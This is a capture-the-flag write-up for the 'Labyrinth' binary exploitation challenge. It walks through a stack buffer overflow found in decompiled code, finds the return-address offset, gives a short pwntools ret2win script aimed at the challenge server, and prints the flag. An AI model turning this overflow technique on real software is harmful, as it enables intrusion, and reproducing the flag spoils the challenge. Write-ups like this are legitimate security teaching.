# Labyrinth WriteUp by Om Honrao (@Inv1s1bl3#7047)

## Challenge Description
```
You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.
```

## Challenge Files
```
- pwn_labyrinth.zip
    ./challenge
    .   /glibc
            ./ld-linux-x86-64.so.2
            ./libc.so.6
        ./flag.txt
        ./labyrinth
```
## Challenge Solution
We start from basic analysis of binary with `checksec` and `file` command.
```bash
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'./glibc/'
```

No PIE and Canary hmm there are chances of BOF Attack and indeed there is a BOF attack.

Lets see the decompiled code in ghidra

```c
{
  int cmp;
  char *__s;
  char userbuf [32];
  ulong door_num;

  setup();
  banner();
  userbuf._0_8_ = 0;
  userbuf._8_8_ = 0;
  userbuf._16_8_ = 0;
  userbuf._24_8_ = 0;
  fwrite("\nSelect door: \n\n",1,0x10,stdout);
  for (door_num = 1; door_num < 0x65; door_num = door_num + 1) {
    if (door_num < 10) {
      fprintf(stdout,"Door: 00%d ",door_num);
    }
    else if (door_num < 100) {
      fprintf(stdout,"Door: 0%d ",door_num);
    }
    else {
      fprintf(stdout,"Door: %d ",door_num);
    }
    if ((door_num % 10 == 0) && (door_num != 0)) {
      putchar(10);
    }
  }
  fwrite("\n>> ",1,4,stdout);
  __s = (char *)malloc(0x10);
  fgets(__s,5,stdin);
  cmp = strncmp(__s,"69",2);
  if (cmp != 0) {
    cmp = strncmp(__s,"069",3);
    if (cmp != 0) goto LAB_004015da;
  }
  fwrite("\nYou are heading to open the door but you suddenly see something on the wall:\n\n\"Fly li ke a bird and be free!\"\n\nWould you like to change the door you chose?\n\n>> "
         ,1,0xa0,stdout);
  fgets(userbuf,0x44,stdin);
LAB_004015da:
  fprintf(stdout,"\n%s[-] YOU FAILED TO ESCAPE!\n\n",&DAT_00402541);
  return 0;
}
```

In short the code does the following.

1.Asks us to select a door
2.Prints the 100 door choices
3.Waits for us to input the door
4.Compares our input against "69" or "069".
5.If input is correct we goto 6. Otherwise we go to 8
6.Asks us if we'd like to change the door
7.Waits for our input
8.Tells us we failed to escaped
9.Exits

It becomes apparent that we first should provide the door number 69 to pass the first check.

The 2nd choice has a buffer overflow inside of it, as it's trying to read 0x44 into a 0x20 sized buffer.

Looking further into the decompilation, we can also see a function called escape_plan which is never called and we can call this as win function as it prints the flag.

So we can say we have Ret2Win exploit.. Lets get the offset first i use pwndbg to do so because its easy to use and gives the offset of buffer quite faster in my opinion.

I created a cyclic pattern to enter and i can see this at ret funtion.
```bash
 ► 0x401602 <main+509>    ret    <0x6161616161616168>
```
Which is `haaaaa` in cyclic pattern because it reads it in reversed manner so we get our offset right which is 0x38. Cool now lets make the script!

```python
from pwn import *

p = remote("165.232.108.200", 30695 )
#p = process("./labyrinth_patched")
#gdb.attach(p,'''''')
p.sendline('69')

win = 0x0000000000401255
payload = b"A"*0x38 +  p64(win+1)

p.sendline(payload)

p.interactive()
```

I don't think i should explain the code because it is quite clear that it just goes till the return address and writes the address of win function and then we get the flag.

## Flag
```
HTB{3sc4p3_fr0m_4b0v3}
```